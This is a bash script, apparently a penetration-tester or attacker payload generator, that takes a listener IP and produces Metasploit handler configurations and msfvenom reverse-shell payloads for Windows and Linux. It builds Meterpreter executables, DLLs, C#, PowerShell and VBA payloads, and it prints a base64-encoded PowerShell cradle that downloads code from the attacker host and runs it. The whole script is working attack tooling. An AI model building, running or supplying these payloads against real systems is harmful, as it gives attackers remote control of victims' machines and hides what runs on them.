#!/bin/bash

# * XOR encoder
# * DotNetToJScript

IP=$1
OUTPUT_DIR=$2

if [ $# -ne 2 ]; then
    echo "Usage: ./payload-gen.sh IP OUTPUT_DIR"
    exit -1
fi

tar xf QuickNotes.tar.gz 
sed -i -e "s/REPLACE_IP/$IP/g" QuickNotes/*.md

# Windows
cat >msfconsole-staged.rc<<EOF
use multi/handler
set payload windows/x64/meterpreter/reverse_https 
set lhost ${IP}
set lport 443
set exitfunc thread
exploit -j
EOF

cat >msfconsole-staged-32.rc<<EOF
use multi/handler
set payload windows/meterpreter/reverse_https 
set lhost ${IP}
set lport 443
set exitfunc thread
exploit -j
EOF


# Linux
cat >msfconsole-staged-linux.rc<<EOF
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost ${IP}
set lport 443
exploit -j
EOF

# Various meterpreter payloads
# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=443 -f elf -o ${OUTPUT_DIR}/rev.elf

# Windows x64
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f dll -o ${OUTPUT_DIR}/met.dll
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f csharp -o ${OUTPUT_DIR}/met.cs
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f exe -o ${OUTPUT_DIR}/msfstaged.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f raw -o ${OUTPUT_DIR}/shell.raw

# Windows x32
msfvenom -p windows/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f ps1 -o ${OUTPUT_DIR}/met.ps1
msfvenom -p windows/meterpreter/reverse_https LHOST=${IP} LPORT=443 EXITFUNC=thread -f vbapplication -o ${OUTPUT_DIR}/met.vbs

# PowerShell enc
echo "================================"
echo "Run this on a windows machine:"
echo "
\$text = \"(New-Object System.Net.WebClient).DownloadString('http://${IP}/run.txt') | IEX\"
\$bytes = [System.Text.Encoding]::Unicode.GetBytes(\$text)
\$EncodedText = [Convert]::ToBase64String(\$bytes)
\$EncodedText

powershell -enc \$EncodedText
"
echo "================================"
